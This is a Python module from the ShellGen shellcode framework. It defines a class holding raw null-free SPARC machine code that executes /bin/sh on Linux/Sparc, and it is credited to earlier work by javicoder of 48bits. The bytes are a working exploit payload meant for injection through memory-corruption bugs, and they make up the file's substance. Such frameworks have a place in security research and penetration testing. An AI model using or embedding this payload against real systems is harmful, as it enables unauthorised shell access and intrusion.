#!/usr/bin/env python

###############################################################################
## Execute /bin/sh in Linux/Sparc                                            ##
## Shellcode for ShellGen                                                    ##
## Based on original code by javicoder from 48bits                           ##
## http://www.48bits.com/papers/sparc_shellcodes.txt                         ##
###############################################################################

# Copyright (c) 2012-2015 Mario Vilas, javicoder
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.

"Execute /bin/sh."

__all__ = ["Shell"]

from shellgen import Static

class Shell (Static):
    """
    Execute /bin/sh in Linux/Sparc.

    Based on original code by javicoder from 48bits:
    `<http://www.48bits.com/papers/sparc_shellcodes.txt>`_
    """

    qualities = "payload"
    encoding  = "nullfree"

    bytes = (
        "\x21\x0b\xd8\x9a\xa0\x14\x21\x6e\x23\x0b"
        "\xdc\xda\x90\x0b\x80\x0e\x82\x10\x20\x0b"
        "\x91\xd0\x20\x10\x82\x10\x20\x01\x90\x1a"
        "\x40\x09\x91\xd0\x20\x10"
    )
